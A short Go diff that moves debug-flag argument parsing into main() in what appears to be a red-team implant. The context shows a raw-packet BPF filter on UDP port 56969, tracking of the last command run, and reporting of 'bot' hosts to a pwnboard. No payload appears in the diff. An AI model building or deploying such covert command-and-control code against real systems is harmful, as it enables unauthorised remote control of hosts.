@@ -26,11 +26,6 @@ import (
 var lastCmdRan string
 
 var debugCheck string = ""
-// Get passed arguments
-// 1 = debug (any string)
-	if len(os.Args) > 1 {
-	debugCheck = os.Args[1]
-} 
 
 // FilterRaw is a BPF struct containing raw instructions.
 // Generate with tcpdump udp and port 56969 -dd
@@ -590,6 +585,13 @@ func updatepwnBoard(bot Host) {
 }
 
 func main() {
+
+	// Get passed arguments
+	// 1 = debug (any string)
+		if len(os.Args) > 1 {
+		debugCheck = os.Args[1]
+	} 
+
 
 	// Create a BPF vm for filtering
 	vm := CreateBPFVM(FilterRaw)
